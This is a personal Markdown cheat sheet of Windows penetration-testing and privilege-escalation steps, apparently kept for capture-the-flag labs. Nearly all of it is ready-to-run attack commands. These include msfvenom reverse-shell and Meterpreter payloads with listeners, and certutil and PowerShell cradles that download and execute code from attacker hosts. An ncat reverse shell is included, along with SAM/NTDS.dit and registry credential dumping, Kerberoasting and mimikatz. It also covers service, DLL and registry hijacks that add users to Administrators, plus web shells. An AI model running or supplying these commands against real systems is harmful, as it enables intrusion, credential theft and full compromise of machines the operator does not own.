# Basic exploit 
`https://www.revshells.com/`
`https://lolbas-project.github.io/`
## Generate payload

learn responder

* msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.33.220 LPORT=9001 -f exe > shell.exe
* get payload to target
* start listener before runing

## Start listener

* msfconsole -> use multi/handler
* set PAYLOAD windows/meterpreter/reverse_tcp
* set LHOST <IP> set LPORT 9001
* wait for connection

## Send Netcat 

* powershell curl http://10.8.123.245:8000/ncat.exe -o ncat.exe

# Download files

## Certutil
* certutil.exe -urlcache -split -f "http://10.99.254.156/msdtl-Service.exe" c:\windows\system32\msdtl.exe

## poweshell
* Invoke-WebRequest -Uri “http://x.x.x.x:8888” -Outfile ASCService.exe

# start smb
* locate smbserver.py
* python3 smbserver.py share smb
* on rce `\\IP\share\nc.exe -e cmd.exe IP REVPORT`

# nishang

* cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
* cp /usr/share/nishang/Shells/Invoke-PowerShellTOneLine.ps1 . => choose first one (replace last line)
* python3 -m http.server 8000
* on victim code exec `powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString('http://YOUR SERVER IP:PORT/Online.ps1')"
* * `IEX(IWR YOUR HOST IP:PORT/shell.ps1  -UseBasicParsing)`

# Directory brute force
* extentions aspx,asp

# Test rce
* ping your IP
* `tcpdump -i eth0 icmp`

# Juicy Potato
* if `whoami /all` SetimpersonatePRivilege ENabled
* get juicy.exe to victim
* follow online

# Manual Enum
* systeminfo
* whoami /all
* net localgroup administrator
* net users administrator
* look for backups
* * copy SAM SYSTEM from Windows/System32/config 
* * if on domain controller grab NTDS.dit SAM SYSTEM to dump AD database
* * `impacket-secretsdump -sam SAM -system SYSTEM local` ==> get second part of hash ==> hashes.org
* *  if hash start with `aad3b4` and `31d6cfe` the account is probably disabled 
* * use smbmap if smb is enabled (vulns/network.md)

# Check for services
* netstat -an
* use chisle.exe to port foward

## Use for rev shell

* ncat.exe 10.8.123.245 9999 -e powershell

# Test connection

* sudo tcpdump -i tun0 icmp (Listerner)
* ping IP || ping -n 1 IP

# Use Crackmapexec to brute force smbs

* crackmapexec smb IP -u user -p wordlist
* supporta { http, smb, mssql, ldap, ssh, winrm}

# Psexec to login through smb with creds

* /usr/share/doc/python3-impacket/examples/psexec.py TROY.thm/achilles:pass@10.10.122.236

# evil-winrm to login to smb with creds

* evil-winrm -i IP -u achilles -p pass

# Sherlock.ps1
* PS> Import-Module .\Sherlock.ps1
* PS> Find-AllVulns
* for hotfixes vulns
* Kernel vuln

# Post

* winpeas
* jaws-enum.ps1
* powerup
* net user <user> | for group
* dir flag.txt /s /p || C dir
* .\Rubeus.exe kerberoast /outfilw:dump.txt -> https://github.com/r3motecontrol/Ghostpack-CompiledBinaries || crack hashes with john
* mimikatz exploit
* check Alwayelevate ( allows user to run msi as admin)
* msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.33.220 LPORT=9001 -f msi > shell.msi || on vitim `msiexec /q /i shell.msi

# Unicorn for metasploit reverse shell (upgrade to metasploit)

* python unicorn.py windows/meterpreter/reverse_tcp RHOST RPORT
* use msfconsole -r unicorn.rc
* starts listener
* (addition) just get the encrypted version (only in quotes) => save as exp.html ==> start `python -m SimpleHTTPServer`
* on basic reverse shell `powershell "IEX(New-Object Net.WebClient).downloadString('http://host/exp.html')"


# Post priv esc with metasploit

* background
* search suggester ==> local_exploit suggester
* set SESSION <id>
* use result
* run

# Powershell Empire
* apt get for kali
* A.V Evation, Cred have, situation awareness, lateral movement, persistence  {DEATH star: auto }
* Star killer GUI for kali | starkiller
* power-shell --rest || localhost:1337  || user - empireadmin password - password123
* responder (poisoning, mitm)
* `sudo powershell-empire server` `sudo powershell-empire client`
* `https://gitlab.com/rpisci2/windows-ccdc/-/wikis/Post-Exploitation/PowerShell-Empire`
* listener->stager->agents

## Starkiller
* use http listener
* use (multi/launcher)-> general (nulti/bash)-> linux (windows/laucher_bat/hta/dll)-> windows STAGER
* launch `laucher.bat`
* module_> select agent and run
* * sherlock
* * mimicat
* * keylog
* on powershell emire `interact AGENTID`

# Privilege escalation (ignore some sc except create)

## Unquoted file path priv esc
* run (tools/PowerSploit/PowerUp.ps1)
* * 
* find file with space e.g "BOOT Turbo/boot.exe"
* * check program data, files, (x86)
* `msfvenom -p windows/shell_reverse_tcp LHOST=10.6.33.220 LPORT=4443 -e x86/shikata_ga_nai -f exe -o BOOT.exe` // or use boot.exe
* upload payload and paste in the parent folder
* start listerner
* restart service `net restart "BOOT Turbo"`

### Alt
* find auto start `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`
* use `accesschk.exe "path of check"` || icacls "path of check"
* look for RW BUILTIUsers => prolly read write perm
* you know some exe will run do on the writeable path use the child'd folder first word as payload 
* try `dir "path of check` if you can access and use first word of a file or the exe it self
* make `msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe`
* restart comp `shutdown /r /t 0` and wait if it has auto start, else restart service

## DLL Hijacking
* `sc qc dllsvc` on victim
* move suspected program to test vm 
* on test vm `sc create dllsvc binpath= c:\location of the sus file.exe type= o`
* (Find point) Procmon.exe > filter > add
* process name > is > (select target) || type name of sus file > add > apply
* path > contains > dll > add > apply
* result > contains > NAME NOT FOUND >
* `sc start dllscv`
* with the list of dlls (double click on operation and find the open operation) > good dll to create (can just replace all)
* check `echo %PATH%` on victim for ideas on where to put dll (Temp is juciy)
* generate dll with (tools/dll-hijack-sample3.c)
* place inside path
* `sc stop dllscv`
* `sc start dllscv`
* check user groups `net user user`
* https://www.youtube.com/watch?v=9s8jYwx9FSA&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=3

## Services (binpath)

* check user groups `net user user`
* move accesschk64.exe to victim
* run `accesschk64.exe -wuvc daclsvc`
* look for SERVICE QUERY CONFIG (jackpot)
* `sc config daclsvc binpath= "net localgroup administrators user /add"`
* `sc start daclsvc` => usually fail
* check user groups `net user user`

## Services (Executable)

* check user groups `net user user`
* move accesschk64.exe to victim
* run `accesschk64.exe "path/allowperm.exe`
* maybe set service `sc create fileperm binpath= c:\location of the sus file.exe type= o`
* look for RW Everyone (jackpot)
* (kali) Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
* `x86_64-w64-mingw32-gcc windows_service.c -o x.exe` => make sure you keep the name
* move x.exe to desktop -> `copy /y C:\User\User\Desktop\x.exe "c;\path\allowperm.exe`
* start service
* check user groups `net user user`

## Services (Registry)

* powershell `Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`
* look for `NT AUTHORITY\INTERACTIVE Allow  FullControl` in Access pane
* (kali) Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
* `x86_64-w64-mingw32-gcc windows_service.c -o x.exe`
* Place x.exe in ‘C:\Temp’.
* Open command prompt at type: `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`
* `sc start regsvc`

## Registry (autorun)(restart need on admin)
* open autorun.exe if possible or run `autorunsc.exe l`
* look in logon tab or check cmd output for sus programs
* Check if they are writeable `accesschk.exe -wvu "sus path"`
* (kali) `msfvenom --platform windows --arch x86 --format exe --encoder generic/none -p windows/meterpreter/reverse_tcp LHOST=10.10.10.107 LPORT=6226 > program.exe`
* replace file and restart, hoping admin logs in

## Startup applications
* check if `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"` allows write or try accesschk
* Add windows payload to path and wait for restart as admin logs in       

## Scheduled task (file not found)
* open autorun -> check schedule task and file missing exe task
* check if `icacls.exe "C:\Path\to\Missing\Task"` allows write or try accesschk
* Add windows payload to path and wait for task to kicking   

## Registry (AlwaysInstallElevated)

* (cmd) `reg query HKLM\Software\Policies\Microsoft\Windows\Installer` => check “AlwaysInstallElevated” value is 1
* (cmd) `reg query HKCU\Software\Policies\Microsoft\Windows\Installer` => check “AlwaysInstallElevated” value is 1 (On user shell)
* (kali) `msfvenom --payload windows/shell_reverse_tcp LHOST=10.10.10.107 LPORT=6225 -f msi -o shell.msi` use this first => listen on nc
* (kali) `msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi`
* (cmd)  `msiexec /quiet /qn /i C:\Path\setup.msi`

# Password mining from mem (iexplore)

* get dump (tskmgr-> processes tab-> right clk- dump)
* perform strings on it

# Password mining from registry ()

* `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername`
* `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword`
* `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42 -v ProxyUsername`
* `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42 -v ProxyPassword`
* `reg query HKEY_CURRENT_USER\Software\TightVNC\Server /v Password`
* `reg query HKEY_CURRENT_USER\Software\TightVNC\Server /v PasswordViewOnly`
* `vncpwd.exe [Encrypted Password]`

# Decrptable passwords from app

* McAfee\Common Framework
* C:\Windows\Panther\Unattend.xml
## Windows VM
1. Open command prompt and type:
copy C:\inetpub\wwwroot\web.config C:\Temp
2. In command prompt type: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\aspnet_regiis.exe -pdf "connectionStrings" C:\Temp
3. In command prompt type: type C:\temp\web.config | findstr connectionString
4. From the output, notice the clear-text credentials.

# Hot Potato

1. In command prompt type: powershell.exe -nop -ep bypass
2. In Power Shell prompt type: Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
3. In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
4. To confirm that the attack was successful, in Power Shell prompt type:
net localgroup administrators

## TrackPopupMenu Win32k Null Pointer Dereference (Metasploit) from Sherlock.ps1
* (msf) use exploit/multi/script/web_delivery
* get meterpreter session then `bg`
* use exploit/windows/local/ms14_058_track_popup_menu
* show options => set target,sessions
* set payload generic/shell_reverse_tcp
* set lhost,lport

# Cmdkey

* cmdkey /list
* `msfvenom --payload windows/shell_reverse_tcp LHOST=10.10.10.107 LPORT=6225 exitfunc=thread -f exe -o shell.exe`
* c:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "shell.exe"

# Find files
* download ripgrep?

# Ippsec Omni video (IOT hack) || Love



# winpeas

* get users
* get update

# LFI

* get WindowsUpdate.log, hosts, win.ini, lincense.rtf
* check SofttwareDistribution/Downloads for recent updates
* check for configs (specifically hosted services )

# Web shell
* (tools/cmdasp.aspx)
* use msfvenom -f aspx

# Web IIS expoit

* Enumerate directories with nmap
* Hydra brute force admin
* Exploit blog engine 3.3.6.0 (searchsploit -m <path>)
* Edit as PostView.ascx
* upload (read expoit for instructions)
* Listen on port
* Capture session

### Metasploit Cont Version
* msfvenom -l payloads
* msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.33.220 LPORT=9001 -f exe > shell.exe

* sudo python3 -m http.server 8000

* go to c:/Windows/Temp

* powershell -c "Invoke-WebRequest -Uri 'http://10.8.123.245:8000/photo.exe' -Outfile 'C:\Windows\Temp\Hack.exe'"

* msfconsole -> use multi/handler

* set PAYLOAD windows/meterpreter/reverse_tcp

* set LHOST <IP> set LPORT 9001

* .\Hack.exe -> gain meterpreter

* drop to shell

* powershell -c "Invoke-WebRequest -Uri 'http://10.6.33.220:8000/tools/winPEAS/winPEAS.bat' -Outfile 'C:\Windows\Temp\winPEAS.bat'"
*.\winPEAS.bat

* Check for vuln processes -> Windows Scheduler -> Program Files ( Event log says message is ran every 30 sec)

* move payload into `c:\Program Files (x86)\SystemScheduler>`

* meterpreter -> mv message.exe message.bak
* mv shell.exe message.exe
* bg
* run multi/handler
* Gain shell
